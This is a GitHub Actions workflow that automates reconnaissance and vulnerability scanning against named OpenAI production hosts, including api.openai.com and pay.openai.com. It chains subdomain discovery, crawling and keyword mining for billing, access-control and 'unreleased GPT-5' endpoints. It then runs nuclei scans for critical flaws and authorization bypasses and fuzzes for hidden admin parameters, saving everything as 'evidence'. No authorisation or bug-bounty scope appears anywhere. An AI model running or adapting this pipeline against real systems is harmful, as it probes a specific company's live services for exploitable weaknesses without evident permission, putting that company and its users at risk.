name: OpenAI-Complete-Goldmine-Hunter
on:
  workflow_dispatch:

jobs:
  exploit-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/lc/gau/v2/cmd/gau@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:Targeted Unified & Internal Recon
        run: |
          # Targeting the specific high-value subdomains found in your logs
          echo "unified-79.api.openai.com" > scope.txt
          echo "unified-8.api.openai.com" >> scope.txt
          echo "api.openai.com" >> scope.txt
          echo "pay.openai.com" >> scope.txt
          
          subfinder -dL scope.txt -silent -o subdomains.txt
          httpx -l subdomains.txt -silent -title -sc -o live_targets.txt

      - name: Phase 2:Deep Mining for BOLA & GPT-5 Intel
        run: |
          # Crawling targets for the 'business', 'internal', and 'gpt-5' paths identified
          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 -c 5 -o all_endpoints.txt
          
          # --- THE GOLD MINING LOGIC ---
          
          # 1. BOLA/Access Control: Targeting the unified gateways and UUIDs
          grep -E "unified|/v[0-9]/|business|education|org-" all_endpoints.txt > potential_access_targets.txt || true
          
          # 2. Billing Logic: Targeting the payment session flows found in logs
          grep -Ei "billing|checkout|payment|session|invoice" all_endpoints.txt > billing_logic_targets.txt || true
          
          # 3. Unreleased Features: Mining for the GPT-5 and Codex references found
          grep -Ei "gpt-5|codex|internal-api|preview|experimental" all_endpoints.txt > unreleased_intel.txt || true

      - name: Phase 3:Automated Logic Testing (Focused)
        run: |
          # Scanning unified endpoints for authorization bypasses
          nuclei -l potential_access_targets.txt -t exposures/ -t vulnerabilities/ -severity critical,high -rl 5 -o nuclei_results.txt || true
          
          # Fuzzing for hidden parameters (e.g., ?admin=true) on unified gateways
          head -n 5 potential_access_targets.txt | while read -r url; do
             arjun -u "$url" --rate-limit 2 -oJ "params_$(date +%s).json" || true
          done

      - name: Archive All Evidence
        uses: actions/upload-artifact@v4
        with:
          name: openai-targeted-results
          path: |
            nuclei_results.txt
            unreleased_intel.txt
            potential_access_targets.txt
            billing_logic_targets.txt
            params_*.json
            
